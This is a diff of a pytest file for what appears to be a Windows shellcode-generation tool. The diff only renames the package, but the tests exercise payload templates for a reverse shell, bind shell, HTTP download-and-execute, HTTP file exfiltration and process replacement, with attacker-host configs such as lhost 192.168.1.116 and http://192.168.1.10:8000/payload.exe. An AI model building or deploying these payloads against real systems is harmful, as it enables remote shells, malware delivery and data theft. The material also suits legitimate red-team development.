@@ -7,58 +7,58 @@ import struct
 
 import pytest
 
-from emitera.tests.conftest import requires_assembler
+from emitrion.tests.conftest import requires_assembler
 
 
 @pytest.fixture
 def revshell_manifest(manifest_dir):
-    from emitera.schema import load
+    from emitrion.schema import load
     return load(str(manifest_dir / "revshell.yaml"))
 
 
 @pytest.fixture
 def default_config():
-    from emitera.payload_templates.base import TemplateConfig
+    from emitrion.payload_templates.base import TemplateConfig
     return TemplateConfig(lhost="192.168.1.116", lport=9001)
 
 
 def test_reverse_shell_wsastartup_slot(revshell_layout, default_config):
-    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
+    from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
     t = ReverseShellTemplate()
     asm = t.emit(revshell_layout, default_config)
     assert revshell_layout.slot("WSAStartup").ebp_ref in asm
 
 
 def test_reverse_shell_wsasocketa_slot(revshell_layout, default_config):
-    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
+    from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
     t = ReverseShellTemplate()
     asm = t.emit(revshell_layout, default_config)
     assert revshell_layout.slot("WSASocketA").ebp_ref in asm
 
 
 def test_reverse_shell_connect_slot(revshell_layout, default_config):
-    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
+    from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
     t = ReverseShellTemplate()
     asm = t.emit(revshell_layout, default_config)
     assert revshell_layout.slot("connect").ebp_ref in asm
 
 
 def test_reverse_shell_createprocessa_slot(revshell_layout, default_config):
-    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
+    from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
     t = ReverseShellTemplate()
     asm = t.emit(revshell_layout, default_config)
     assert revshell_layout.slot("CreateProcessA").ebp_ref in asm
 
 
 def test_reverse_shell_socket_handle_slot(revshell_layout, default_config):
-    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
+    from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
     t = ReverseShellTemplate()
     asm = t.emit(revshell_layout, default_config)
     assert revshell_layout.slot("socket_handle").ebp_ref in asm
 
 
 def test_reverse_shell_lhost_as_hex(revshell_layout, default_config):
-    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
+    from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
     t = ReverseShellTemplate()
     lhost = default_config.lhost
     ip_le = struct.unpack("<I", socket.inet_aton(lhost))[0]
@@ -67,7 +67,7 @@ def test_reverse_shell_lhost_as_hex(revshell_layout, default_config):
 
 
 def test_reverse_shell_lport_as_hex(revshell_layout, default_config):
-    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
+    from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
     t = ReverseShellTemplate()
     port_be = socket.htons(default_config.lport)
     asm = t.emit(revshell_layout, default_config)
@@ -75,7 +75,7 @@ def test_reverse_shell_lport_as_hex(revshell_layout, default_config):
 
 
 def test_reverse_shell_no_hardcoded_offsets(revshell_layout, default_config):
-    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
+    from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
     t = ReverseShellTemplate()
     asm = t.emit(revshell_layout, default_config)
     # Every [ebp-0xNN] in the output must correspond to a known layout slot
@@ -85,8 +85,8 @@ def test_reverse_shell_no_hardcoded_offsets(revshell_layout, default_config):
 
 
 def test_run_command_winexec_slot(manifest_dir, calc_layout):
-    from emitera.payload_templates.base import TemplateConfig
-    from emitera.payload_templates.run_command import RunCommandTemplate
+    from emitrion.payload_templates.base import TemplateConfig
+    from emitrion.payload_templates.run_command import RunCommandTemplate
     t = RunCommandTemplate()
     config = TemplateConfig(command="calc.exe", badchars={0x00})
     asm = t.emit(calc_layout, config)
@@ -94,10 +94,10 @@ def test_run_command_winexec_slot(manifest_dir, calc_layout):
 
 
 def test_run_command_uses_cmd_slot_when_available(manifest_dir, default_config):
-    from emitera.build import _merge_template_requirements
-    from emitera.payload_templates.run_command import RunCommandTemplate
-    from emitera.schema import load
-    from emitera.stack_alloc import build_layout
+    from emitrion.build import _merge_template_requirements
+    from emitrion.payload_templates.run_command import RunCommandTemplate
+    from emitrion.schema import load
+    from emitrion.stack_alloc import build_layout
     t = RunCommandTemplate()
     manifest = load(str(manifest_dir / "revshell.yaml"))
     manifest = _merge_template_requirements(manifest, t, default_config)
@@ -109,10 +109,10 @@ def test_run_command_uses_cmd_slot_when_available(manifest_dir, default_config):
 
 
 def test_run_command_inline_push_fallback():
-    from emitera.payload_templates.base import TemplateConfig
-    from emitera.payload_templates.run_command import RunCommandTemplate
-    from emitera.schema import Manifest
-    from emitera.stack_alloc import build_layout
+    from emitrion.payload_templates.base import TemplateConfig
+    from emitrion.payload_templates.run_command import RunCommandTemplate
+    from emitrion.schema import Manifest
+    from emitrion.stack_alloc import build_layout
     t = RunCommandTemplate()
     layout = build_layout(Manifest(
         badchars={0x00},
@@ -126,8 +126,8 @@ def test_run_command_inline_push_fallback():
 
 
 def test_calc_uses_initialized_cmd_slot(manifest_dir, tmp_path):
-    from emitera.build import build
-    from emitera.payload_templates.base import TemplateConfig
+    from emitrion.build import build
+    from emitrion.payload_templates.base import TemplateConfig
     result = build(
         str(manifest_dir / "calc.yaml"),
         template_name="run_command",
@@ -143,7 +143,7 @@ def test_calc_uses_initialized_cmd_slot(manifest_dir, tmp_path):
 
 
 def test_reverse_shell_cmd_slot_referenced(revshell_layout, default_config):
-    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
+    from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
     t = ReverseShellTemplate()
     asm = t.emit(revshell_layout, default_config)
     cmd_ref = revshell_layout.slot("cmd").ebp_ref
@@ -151,14 +151,14 @@ def test_reverse_shell_cmd_slot_referenced(revshell_layout, default_config):
 
 
 def test_reverse_shell_startupinfoa_slot(revshell_layout, default_config):
-    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
+    from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
     t = ReverseShellTemplate()
     asm = t.emit(revshell_layout, default_config)
     assert revshell_layout.slot("STARTUPINFOA").ebp_ref in asm
 
 
 def test_reverse_shell_wsadata_slot(revshell_layout, default_config):
-    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
+    from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
     t = ReverseShellTemplate()
     asm = t.emit(revshell_layout, default_config)
     assert revshell_layout.slot("WSADATA").ebp_ref in asm
@@ -173,30 +173,30 @@ class TestProbeSlots:
     """PayloadTemplate.probe_slots discovers slot references from emit()."""
 
     def test_reverse_shell_probe_includes_apis(self, default_config):
-        from emitera.payload_templates.reverse_shell import ReverseShellTemplate
+        from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
         slots = ReverseShellTemplate().probe_slots(default_config)
         for api in ("WSAStartup", "WSASocketA", "connect", "CreateProcessA"):
             assert api in slots
 
     def test_reverse_shell_probe_includes_variables(self, default_config):
-        from emitera.payload_templates.reverse_shell import ReverseShellTemplate
+        from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
         slots = ReverseShellTemplate().probe_slots(default_config)
         assert "socket_handle" in slots
 
     def test_reverse_shell_probe_includes_structures(self, default_config):
-        from emitera.payload_templates.reverse_shell import ReverseShellTemplate
+        from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
         slots = ReverseShellTemplate().probe_slots(default_config)
         for struct in ("WSADATA", "sockaddr_in", "STARTUPINFOA", "PROCESS_INFORMATION"):
             assert struct in slots
 
     def test_probe_returns_unique_names(self, default_config):
-        from emitera.payload_templates.tcp_download import TcpDownloadTemplate
+        from emitrion.payload_templates.tcp_download import TcpDownloadTemplate
         slots = TcpDownloadTemplate().probe_slots(default_config)
         assert len(slots) == len(set(slots))
 
     def test_run_command_probe_includes_optional_cmd(self):
-        from emitera.payload_templates.base import TemplateConfig
-        from emitera.payload_templates.run_command import RunCommandTemplate
+        from emitrion.payload_templates.base import TemplateConfig
+        from emitrion.payload_templates.run_command import RunCommandTemplate
         config = TemplateConfig(command="calc.exe")
         slots = RunCommandTemplate().probe_slots(config)
         assert "WinExec" in slots
@@ -207,10 +207,10 @@ class TestMergeTemplateRequirements:
     """_merge_template_requirements auto-adds missing APIs only."""
 
     def test_adds_missing_api(self, manifest_dir):
-        from emitera.build import _merge_template_requirements
-        from emitera.payload_templates.base import TemplateConfig
-        from emitera.payload_templates.run_command import RunCommandTemplate
-        from emitera.schema import load
+        from emitrion.build import _merge_template_requirements
+        from emitrion.payload_templates.base import TemplateConfig
+        from emitrion.payload_templates.run_command import RunCommandTemplate
+        from emitrion.schema import load
         manifest = load(str(manifest_dir / "revshell.yaml"))
         assert "WinExec" not in manifest.functions
         config = TemplateConfig()
@@ -218,20 +218,20 @@ class TestMergeTemplateRequirements:
         assert "WinExec" in merged.functions
 
     def test_does_not_auto_add_variables(self, manifest_dir):
-        from emitera.build import _merge_template_requirements
-        from emitera.payload_templates.base import TemplateConfig
-        from emitera.payload_templates.bind_shell import BindShellTemplate
-        from emitera.schema import load
+        from emitrion.build import _merge_template_requirements
+        from emitrion.payload_templates.base import TemplateConfig
+        from emitrion.payload_templates.bind_shell import BindShellTemplate
+        from emitrion.schema import load
         manifest = load(str(manifest_dir / "revshell.yaml"))
         config = TemplateConfig()
         merged = _merge_template_requirements(manifest, BindShellTemplate(), config)
         assert merged.variables == manifest.variables
 
     def test_does_not_duplicate_existing(self, manifest_dir):
-        from emitera.build import _merge_template_requirements
-        from emitera.payload_templates.base import TemplateConfig
-        from emitera.payload_templates.reverse_shell import ReverseShellTemplate
-        from emitera.schema import load
+        from emitrion.build import _merge_template_requirements
+        from emitrion.payload_templates.base import TemplateConfig
+        from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
+        from emitrion.schema import load
         manifest = load(str(manifest_dir / "revshell.yaml"))
         config = TemplateConfig()
         merged = _merge_template_requirements(manifest, ReverseShellTemplate(), config)
@@ -239,10 +239,10 @@ class TestMergeTemplateRequirements:
         assert merged.functions.count("connect") == 1
 
     def test_auto_adds_loadlibrarya_for_ws2(self):
-        from emitera.build import _merge_template_requirements
-        from emitera.payload_templates.base import TemplateConfig
-        from emitera.payload_templates.tcp_stager import TcpStagerTemplate
-        from emitera.schema import Manifest, StringEntry
+        from emitrion.build import _merge_template_requirements
+        from emitrion.payload_templates.base import TemplateConfig
+        from emitrion.payload_templates.tcp_stager import TcpStagerTemplate
+        from emitrion.schema import Manifest, StringEntry
         bare = Manifest(badchars={0x00}, functions=[], strings=[
             StringEntry(label="ws2_dll", value="ws2_32.dll", method="push"),
         ])
@@ -251,10 +251,10 @@ class TestMergeTemplateRequirements:
         assert "LoadLibraryA" in merged.functions
 
     def test_noop_when_manifest_complete(self, manifest_dir):
-        from emitera.build import _merge_template_requirements
-        from emitera.payload_templates.base import TemplateConfig
-        from emitera.payload_templates.reverse_shell import ReverseShellTemplate
-        from emitera.schema import load
+        from emitrion.build import _merge_template_requirements
+        from emitrion.payload_templates.base import TemplateConfig
+        from emitrion.payload_templates.reverse_shell import ReverseShellTemplate
+        from emitrion.schema import load
         manifest = load(str(manifest_dir / "revshell.yaml"))
         config = TemplateConfig()
         merged = _merge_template_requirements(manifest, ReverseShellTemplate(), config)
@@ -262,8 +262,8 @@ class TestMergeTemplateRequirements:
 
     def test_build_with_incomplete_manifest_succeeds(self, manifest_dir, tmp_path):
         """An incomplete manifest + template should auto-fill and build."""
-        from emitera.build import build
-        from emitera.payload_templates.base import TemplateConfig
+        from emitrion.build import build
+        from emitrion.payload_templates.base import TemplateConfig
         result = build(
             str(manifest_dir / "calc.yaml"),
             template_name="run_command",
@@ -281,7 +281,7 @@ class TestMergeTemplateRequirements:
 
 @pytest.fixture
 def http_config():
-    from emitera.payload_templates.base import TemplateConfig
+    from emitrion.payload_templates.base import TemplateConfig
     return TemplateConfig(
         lhost="192.168.1.10",
         lport=8000,
@@ -291,56 +291,56 @@ def http_config():
 
 
 def test_http_download_inet_open_slot(http_download_layout, http_config):
-    from emitera.payload_templates.http_download import HttpDownloadTemplate
+    from emitrion.payload_templates.http_download import HttpDownloadTemplate
     t = HttpDownloadTemplate()
     asm = t.emit(http_download_layout, http_config)
     assert http_download_layout.slot("InternetOpenA").ebp_ref in asm
 
 
 def test_http_download_inet_openurl_slot(http_download_layout, http_config):
-    from emitera.payload_templates.http_download import HttpDownloadTemplate
+    from emitrion.payload_templates.http_download import HttpDownloadTemplate
     t = HttpDownloadTemplate()
     asm = t.emit(http_download_layout, http_config)
     assert http_download_layout.slot("InternetOpenUrlA").ebp_ref in asm
 
 
 def test_http_download_inet_readfile_slot(http_download_layout, http_config):
-    from emitera.payload_templates.http_download import HttpDownloadTemplate
+    from emitrion.payload_templates.http_download import HttpDownloadTemplate
     t = HttpDownloadTemplate()
     asm = t.emit(http_download_layout, http_config)
     assert http_download_layout.slot("InternetReadFile").ebp_ref in asm
 
 
 def test_http_download_inet_close_slot(http_download_layout, http_config):
-    from emitera.payload_templates.http_download import HttpDownloadTemplate
+    from emitrion.payload_templates.http_download import HttpDownloadTemplate
     t = HttpDownloadTemplate()
     asm = t.emit(http_download_layout, http_config)
     assert http_download_layout.slot("InternetCloseHandle").ebp_ref in asm
 
 
 def test_http_download_virtualalloc_slot(http_download_layout, http_config):
-    from emitera.payload_templates.http_download import HttpDownloadTemplate
+    from emitrion.payload_templates.http_download import HttpDownloadTemplate
     t = HttpDownloadTemplate()
     asm = t.emit(http_download_layout, http_config)
     assert http_download_layout.slot("VirtualAlloc").ebp_ref in asm
 
 
 def test_http_download_createfile_slot(http_download_layout, http_config):
-    from emitera.payload_templates.http_download import HttpDownloadTemplate
+    from emitrion.payload_templates.http_download import HttpDownloadTemplate
     t = HttpDownloadTemplate()
     asm = t.emit(http_download_layout, http_config)
     assert http_download_layout.slot("CreateFileA").ebp_ref in asm
 
 
 def test_http_download_winexec_slot(http_download_layout, http_config):
-    from emitera.payload_templates.http_download import HttpDownloadTemplate
+    from emitrion.payload_templates.http_download import HttpDownloadTemplate
     t = HttpDownloadTemplate()
     asm = t.emit(http_download_layout, http_config)
     assert http_download_layout.slot("WinExec").ebp_ref in asm
 
 
 def test_http_download_variable_slots(http_download_layout, http_config):
-    from emitera.payload_templates.http_download import HttpDownloadTemplate
+    from emitrion.payload_templates.http_download import HttpDownloadTemplate
     t = HttpDownloadTemplate()
     asm = t.emit(http_download_layout, http_config)
     for var in ("inet_session", "inet_url", "virt_buf", "file_handle",
@@ -349,7 +349,7 @@ def test_http_download_variable_slots(http_download_layout, http_config):
 
 
 def test_http_download_string_slots(http_download_layout, http_config):
-    from emitera.payload_templates.http_download import HttpDownloadTemplate
+    from emitrion.payload_templates.http_download import HttpDownloadTemplate
     t = HttpDownloadTemplate()
     asm = t.emit(http_download_layout, http_config)
     for label in ("user_agent", "url", "dst_path"):
@@ -357,7 +357,7 @@ def test_http_download_string_slots(http_download_layout, http_config):
 
 
 def test_http_download_no_hardcoded_offsets(http_download_layout, http_config):
-    from emitera.payload_templates.http_download import HttpDownloadTemplate
+    from emitrion.payload_templates.http_download import HttpDownloadTemplate
     t = HttpDownloadTemplate()
     asm = t.emit(http_download_layout, http_config)
     known_refs = {s.ebp_ref for s in http_download_layout.all_slots()}
@@ -366,7 +366,7 @@ def test_http_download_no_hardcoded_offsets(http_download_layout, http_config):
 
 
 def test_http_download_read_loop_bounds_check(http_download_layout, http_config):
-    from emitera.payload_templates.http_download import HttpDownloadTemplate
+    from emitrion.payload_templates.http_download import HttpDownloadTemplate
     t = HttpDownloadTemplate()
     asm = t.emit(http_download_layout, http_config)
     assert "buffer full" in asm
@@ -376,7 +376,7 @@ def test_http_download_read_loop_bounds_check(http_download_layout, http_config)
 
 
 def test_http_download_checks_return_value(http_download_layout, http_config):
-    from emitera.payload_templates.http_download import HttpDownloadTemplate
+    from emitrion.payload_templates.http_download import HttpDownloadTemplate
     t = HttpDownloadTemplate()
     asm = t.emit(http_download_layout, http_config)
     lines = asm.splitlines()
@@ -401,33 +401,33 @@ def test_http_download_checks_return_value(http_download_layout, http_config):
 class TestHttpDownloadProbeSlots:
 
     def test_probe_includes_wininet_apis(self, http_config):
-        from emitera.payload_templates.http_download import HttpDownloadTemplate
+        from emitrion.payload_templates.http_download import HttpDownloadTemplate
         slots = HttpDownloadTemplate().probe_slots(http_config)
         for api in ("InternetOpenA", "InternetOpenUrlA", "InternetReadFile",
                      "InternetCloseHandle"):
             assert api in slots
 
     def test_probe_includes_kernel32_apis(self, http_config):
-        from emitera.payload_templates.http_download import HttpDownloadTemplate
+        from emitrion.payload_templates.http_download import HttpDownloadTemplate
         slots = HttpDownloadTemplate().probe_slots(http_config)
         for api in ("VirtualAlloc", "CreateFileA", "WriteFile", "CloseHandle", "WinExec"):
             assert api in slots
 
     def test_probe_includes_variables(self, http_config):
-        from emitera.payload_templates.http_download import HttpDownloadTemplate
+        from emitrion.payload_templates.http_download import HttpDownloadTemplate
         slots = HttpDownloadTemplate().probe_slots(http_config)
         for var in ("inet_session", "inet_url", "virt_buf", "file_handle",
                      "bytes_read", "bytes_total"):
             assert var in slots
 
     def test_probe_includes_strings(self, http_config):
-        from emitera.payload_templates.http_download import HttpDownloadTemplate
+        from emitrion.payload_templates.http_download import HttpDownloadTemplate
         slots = HttpDownloadTemplate().probe_slots(http_config)
         for label in ("user_agent", "url", "dst_path"):
             assert label in slots
 
     def test_probe_returns_unique(self, http_config):
-        from emitera.payload_templates.http_download import HttpDownloadTemplate
+        from emitrion.payload_templates.http_download import HttpDownloadTemplate
         slots = HttpDownloadTemplate().probe_slots(http_config)
         assert len(slots) == len(set(slots))
 
@@ -435,10 +435,10 @@ class TestHttpDownloadProbeSlots:
 class TestHttpDownloadAutoDerive:
 
     def test_auto_adds_loadlibrarya_for_wininet(self):
-        from emitera.build import _merge_template_requirements
-        from emitera.payload_templates.base import TemplateConfig
-        from emitera.payload_templates.http_download import HttpDownloadTemplate
-        from emitera.schema import Manifest, StringEntry
+        from emitrion.build import _merge_template_requirements
+        from emitrion.payload_templates.base import TemplateConfig
+        from emitrion.payload_templates.http_download import HttpDownloadTemplate
+        from emitrion.schema import Manifest, StringEntry
         bare = Manifest(badchars={0x00}, functions=[], strings=[
             StringEntry(label="wininet_dll", value="wininet.dll", method="push"),
             StringEntry(label="user_agent", value="Mozilla/5.0", method="mov"),
@@ -451,8 +451,8 @@ class TestHttpDownloadAutoDerive:
         assert "InternetOpenA" in merged.functions
 
     def test_full_build_succeeds(self, manifest_dir, tmp_path):
-        from emitera.build import build
-        from emitera.payload_templates.base import TemplateConfig
+        from emitrion.build import build
+        from emitrion.payload_templates.base import TemplateConfig
         config = TemplateConfig(
             url="http://192.168.1.10:8000/payload.exe",
             dst_path="C:\\Windows\\Temp\\payload.exe",
@@ -470,8 +470,8 @@ class TestHttpDownloadAutoDerive:
         assert result.layout is not None
 
     def test_url_cli_override(self, manifest_dir, tmp_path):
-        from emitera.build import build
-        from emitera.payload_templates.base import TemplateConfig
+        from emitrion.build import build
+        from emitrion.payload_templates.base import TemplateConfig
         config = TemplateConfig(
             url="http://10.0.0.1:9999/custom.bin",
             dst_path="C:\\Windows\\Temp\\payload.exe",
@@ -492,7 +492,7 @@ class TestHttpDownloadAutoDerive:
 
 @pytest.fixture
 def exfil_config():
-    from emitera.payload_templates.base import TemplateConfig
+    from emitrion.payload_templates.base import TemplateConfig
     return TemplateConfig(
         lhost="192.168.1.10",
         lport=8000,
@@ -502,56 +502,56 @@ def exfil_config():
 
 
 def test_http_exfil_createfile_slot(http_exfil_layout, exfil_config):
-    from emitera.payload_templates.http_exfil import HttpExfilTemplate
+    from emitrion.payload_templates.http_exfil import HttpExfilTemplate
     t = HttpExfilTemplate()
     asm = t.emit(http_exfil_layout, exfil_config)
     assert http_exfil_layout.slot("CreateFileA").ebp_ref in asm
 
 
 def test_http_exfil_readfile_slot(http_exfil_layout, exfil_config):
-    from emitera.payload_templates.http_exfil import HttpExfilTemplate
+    from emitrion.payload_templates.http_exfil import HttpExfilTemplate
     t = HttpExfilTemplate()
     asm = t.emit(http_exfil_layout, exfil_config)
     assert http_exfil_layout.slot("ReadFile").ebp_ref in asm
 
 
 def test_http_exfil_inet_open_slot(http_exfil_layout, exfil_config):
-    from emitera.payload_templates.http_exfil import HttpExfilTemplate
+    from emitrion.payload_templates.http_exfil import HttpExfilTemplate
     t = HttpExfilTemplate()
     asm = t.emit(http_exfil_layout, exfil_config)
     assert http_exfil_layout.slot("InternetOpenA").ebp_ref in asm
 
 
 def test_http_exfil_inet_connect_slot(http_exfil_layout, exfil_config):
-    from emitera.payload_templates.http_exfil import HttpExfilTemplate
+    from emitrion.payload_templates.http_exfil import HttpExfilTemplate
     t = HttpExfilTemplate()
     asm = t.emit(http_exfil_layout, exfil_config)
     assert http_exfil_layout.slot("InternetConnectA").ebp_ref in asm
 
 
 def test_http_exfil_http_open_slot(http_exfil_layout, exfil_config):
-    from emitera.payload_templates.http_exfil import HttpExfilTemplate
+    from emitrion.payload_templates.http_exfil import HttpExfilTemplate
     t = HttpExfilTemplate()
     asm = t.emit(http_exfil_layout, exfil_config)
     assert http_exfil_layout.slot("HttpOpenRequestA").ebp_ref in asm
 
 
 def test_http_exfil_http_send_slot(http_exfil_layout, exfil_config):
-    from emitera.payload_templates.http_exfil import HttpExfilTemplate
+    from emitrion.payload_templates.http_exfil import HttpExfilTemplate
     t = HttpExfilTemplate()
     asm = t.emit(http_exfil_layout, exfil_config)
     assert http_exfil_layout.slot("HttpSendRequestA").ebp_ref in asm
 
 
 def test_http_exfil_inet_close_slot(http_exfil_layout, exfil_config):
-    from emitera.payload_templates.http_exfil import HttpExfilTemplate
+    from emitrion.payload_templates.http_exfil import HttpExfilTemplate
     t = HttpExfilTemplate()
     asm = t.emit(http_exfil_layout, exfil_config)
     assert http_exfil_layout.slot("InternetCloseHandle").ebp_ref in asm
 
 
 def test_http_exfil_variable_slots(http_exfil_layout, exfil_config):
-    from emitera.payload_templates.http_exfil import HttpExfilTemplate
+    from emitrion.payload_templates.http_exfil import HttpExfilTemplate
     t = HttpExfilTemplate()
     asm = t.emit(http_exfil_layout, exfil_config)
     for var in ["inet_session", "inet_connect", "inet_request",
@@ -560,7 +560,7 @@ def test_http_exfil_variable_slots(http_exfil_layout, exfil_config):
 
 
 def test_http_exfil_string_slots(http_exfil_layout, exfil_config):
-    from emitera.payload_templates.http_exfil import HttpExfilTemplate
+    from emitrion.payload_templates.http_exfil import HttpExfilTemplate
     t = HttpExfilTemplate()
     asm = t.emit(http_exfil_layout, exfil_config)
     for s in ["src_path", "exfil_host", "url_path", "http_post", "user_agent"]:
@@ -570,7 +570,7 @@ def test_http_exfil_string_slots(http_exfil_layout, exfil_config):
 def test_http_exfil_no_hardcoded_offsets(http_exfil_layout, exfil_config):
     import re
 
-    from emitera.payload_templates.http_exfil import HttpExfilTemplate
+    from emitrion.payload_templates.http_exfil import HttpExfilTemplate
     t = HttpExfilTemplate()
     asm = t.emit(http_exfil_layout, exfil_config)
     known_refs = {s.ebp_ref for s in http_exfil_layout.all_slots()}
@@ -579,7 +579,7 @@ def test_http_exfil_no_hardcoded_offsets(http_exfil_layout, exfil_config):
 
 
 def test_http_exfil_read_loop_bounds_check(http_exfil_layout, exfil_config):
-    from emitera.payload_templates.http_exfil import HttpExfilTemplate
+    from emitrion.payload_templates.http_exfil import HttpExfilTemplate
     t = HttpExfilTemplate()
     asm = t.emit(http_exfil_layout, exfil_config)
     assert "exfil_read_loop:" in asm
@@ -589,7 +589,7 @@ def test_http_exfil_read_loop_bounds_check(http_exfil_layout, exfil_config):
 
 
 def test_http_exfil_generic_read(http_exfil_layout, exfil_config):
-    from emitera.payload_templates.http_exfil import HttpExfilTemplate
+    from emitrion.payload_templates.http_exfil import HttpExfilTemplate
     t = HttpExfilTemplate()
     asm = t.emit(http_exfil_layout, exfil_config)
     assert "GENERIC_READ" in asm
@@ -597,7 +597,7 @@ def test_http_exfil_generic_read(http_exfil_layout, exfil_config):
 
 
 def test_http_exfil_post_verb(http_exfil_layout, exfil_config):
-    from emitera.payload_templates.http_exfil import HttpExfilTemplate
+    from emitrion.payload_templates.http_exfil import HttpExfilTemplate
     t = HttpExfilTemplate()
     asm = t.emit(http_exfil_layout, exfil_config)
     assert "POST" in asm
@@ -605,7 +605,7 @@ def test_http_exfil_post_verb(http_exfil_layout, exfil_config):
 
 class TestHttpExfilProbeSlots:
     def test_discovers_all_api_slots(self, exfil_config):
-        from emitera.payload_templates.http_exfil import HttpExfilTemplate
+        from emitrion.payload_templates.http_exfil import HttpExfilTemplate
         t = HttpExfilTemplate()
         slots = t.probe_slots(exfil_config)
         for api in ["CreateFileA", "ReadFile", "CloseHandle", "VirtualAlloc",
@@ -614,7 +614,7 @@ class TestHttpExfilProbeSlots:
             assert api in slots, f"missing API slot: {api}"
 
     def test_discovers_variable_slots(self, exfil_config):
-        from emitera.payload_templates.http_exfil import HttpExfilTemplate
+        from emitrion.payload_templates.http_exfil import HttpExfilTemplate
         t = HttpExfilTemplate()
         slots = t.probe_slots(exfil_config)
         for var in ["inet_session", "inet_connect", "inet_request",
@@ -622,7 +622,7 @@ class TestHttpExfilProbeSlots:
             assert var in slots, f"missing var slot: {var}"
 
     def test_discovers_string_slots(self, exfil_config):
-        from emitera.payload_templates.http_exfil import HttpExfilTemplate
+        from emitrion.payload_templates.http_exfil import HttpExfilTemplate
         t = HttpExfilTemplate()
         slots = t.probe_slots(exfil_config)
         for s in ["src_path", "exfil_host", "url_path", "http_post", "user_agent"]:
@@ -631,8 +631,8 @@ class TestHttpExfilProbeSlots:
 
 class TestHttpExfilAutoDerive:
     def test_auto_derives_missing_apis(self, manifest_dir, tmp_path):
-        from emitera.build import build
-        from emitera.payload_templates.base import TemplateConfig
+        from emitrion.build import build
+        from emitrion.payload_templates.base import TemplateConfig
         config = TemplateConfig(
             lhost="192.168.1.10",
             lport=8000,
@@ -649,8 +649,8 @@ class TestHttpExfilAutoDerive:
 
     @requires_assembler
     def test_full_build_assembles(self, manifest_dir, tmp_path):
-        from emitera.build import build
-        from emitera.payload_templates.base import TemplateConfig
+        from emitrion.build import build
+        from emitrion.payload_templates.base import TemplateConfig
         config = TemplateConfig(
             lhost="192.168.1.10",
             lport=8000,
@@ -672,7 +672,7 @@ class TestHttpExfilAutoDerive:
 
 @pytest.fixture
 def pr_config():
-    from emitera.payload_templates.base import TemplateConfig
+    from emitrion.payload_templates.base import TemplateConfig
     return TemplateConfig(
         process_name="notepad.exe",
         src_path="C:\\Windows\\Temp\\payload.exe",
@@ -681,49 +681,49 @@ def pr_config():
 
 
 def test_process_replace_snapshot_slot(process_replace_layout, pr_config):
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
     asm = t.emit(process_replace_layout, pr_config)
     assert process_replace_layout.slot("CreateToolhelp32Snapshot").ebp_ref in asm
 
 
 def test_process_replace_p32first_slot(process_replace_layout, pr_config):
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
     asm = t.emit(process_replace_layout, pr_config)
     assert process_replace_layout.slot("Process32First").ebp_ref in asm
 
 
 def test_process_replace_p32next_slot(process_replace_layout, pr_config):
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
     asm = t.emit(process_replace_layout, pr_config)
     assert process_replace_layout.slot("Process32Next").ebp_ref in asm
 
 
 def test_process_replace_openprocess_slot(process_replace_layout, pr_config):
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
     asm = t.emit(process_replace_layout, pr_config)
     assert process_replace_layout.slot("OpenProcess").ebp_ref in asm
 
 
 def test_process_replace_terminate_slot(process_replace_layout, pr_config):
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
     asm = t.emit(process_replace_layout, pr_config)
     assert process_replace_layout.slot("TerminateProcess").ebp_ref in asm
 
 
 def test_process_replace_wait_slot(process_replace_layout, pr_config):
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
     asm = t.emit(process_replace_layout, pr_config)
     assert process_replace_layout.slot("WaitForSingleObject").ebp_ref in asm
 
 
 def test_process_replace_variable_slots(process_replace_layout, pr_config):
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
     asm = t.emit(process_replace_layout, pr_config)
     assert process_replace_layout.slot("snapshot_handle").ebp_ref in asm
@@ -731,7 +731,7 @@ def test_process_replace_variable_slots(process_replace_layout, pr_config):
 
 
 def test_process_replace_string_slots(process_replace_layout, pr_config):
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
     asm = t.emit(process_replace_layout, pr_config)
     assert process_replace_layout.slot("process_name").ebp_ref in asm
@@ -742,7 +742,7 @@ def test_process_replace_string_slots(process_replace_layout, pr_config):
 def test_process_replace_no_hardcoded_offsets(process_replace_layout, pr_config):
     import re
 
-    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
+    from emitrion.payload_templates.process_replace import ProcessReplaceTemplate
     t = ProcessReplaceTemplate()
